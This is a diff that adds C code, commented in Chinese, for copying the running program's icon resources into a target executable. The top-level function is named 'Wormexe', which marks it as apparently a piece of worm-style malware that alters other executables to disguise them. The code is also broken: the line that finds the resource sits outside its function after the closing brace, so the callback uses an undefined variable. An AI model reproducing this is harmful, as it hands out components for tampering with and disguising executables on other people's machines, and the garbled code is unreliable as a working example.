@@ -1,0 +1,58 @@
+BOOL SetRes(LPSTR szObjFileName, LPSTR szResType, LPSTR szResName, LPVOID pData, DWORD dwSize)
+{
+	//更新资源
+	HANDLE hExe = BeginUpdateResource(szObjFileName, FALSE);
+	if (hExe == NULL)
+		return FALSE;
+	UpdateResource(hExe, szResName, szResType, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pData, dwSize);
+
+	EndUpdateResource(hExe, FALSE);
+
+	return TRUE;
+}
+
+//枚举资源回调函数
+BOOL CALLBACK EnumIconProc(HMODULE hModule, LPCTSTR lpszType, LPTSTR lpszName, LONG lParam)
+{
+	//查找资源
+	if (hRes == NULL)
+	{
+		return FALSE;
+	}
+
+	HGLOBAL hResLoad = LoadResource(hModule, hRes);
+	LPVOID pData = LockResource(hResLoad);
+	DWORD dwSize = SizeofResource(hModule, hRes);
+
+	if (lParam)
+	{
+		SetRes((LPSTR)lParam, RT_ICON, lpszName, pData, dwSize);
+	}
+	return true;
+}	HRSRC hRes = FindResource(hModule, lpszName, RT_ICON);
+
+
+//替换图标
+BOOL SetExeIcon(char *szCurrentExePath, char *szObjexepath)
+{
+	HMODULE hExe = LoadLibrary(szCurrentExePath);
+	if (hExe == NULL)
+	{
+		return FALSE;
+	}
+	//枚举二进制模块指定的资源类型
+	EnumResourceNames(hExe, RT_ICON, EnumIconProc, (LONG)szObjexepath);
+	return TRUE;
+}
+
+
+//修改图标
+BOOL Wormexe(char *szObjexepath)
+{
+	char szCurrentExePath[MAX_PATH];
+	GetModuleFileNameA(NULL, (LPSTR)szCurrentExePath, MAX_PATH);
+
+	SetExeIcon(szCurrentExePath, szObjexepath);
+	
+	return TRUE;
+}
